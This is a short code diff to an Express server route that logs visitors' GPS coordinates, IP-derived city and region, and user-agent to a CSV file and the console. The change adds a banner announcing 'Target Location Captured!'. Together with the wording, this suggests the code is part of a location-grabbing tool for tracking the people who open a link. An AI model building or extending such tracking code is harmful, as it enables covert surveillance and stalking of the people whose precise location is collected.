@@ -53,7 +53,12 @@ app.post('/api/log-gps', (req, res) => {
     const geo = geoip.lookup(ip) || { city: 'Unknown', region: 'Unknown' };
     logVisitToCSV(ip, geo.city, geo.region, 'GPS-Based (Active)', lat, lng);
     
-    console.log(`[!!!] SUCCESS: GPS Captured -> Lat: ${lat}, Lng: ${lng}`);
+    console.log("-----------------------------------------");
+    console.log("🎯 ALERT: Target Location Captured!");
+    console.log(`Latitude:  ${lat}`);
+    console.log(`Longitude: ${lng}`);
+    console.log(`User-Agent: ${req.headers['user-agent']}`);
+    console.log("-----------------------------------------");
     res.status(200).json({ success: true });
   } catch (error) {
     res.status(500).json({ success: false });
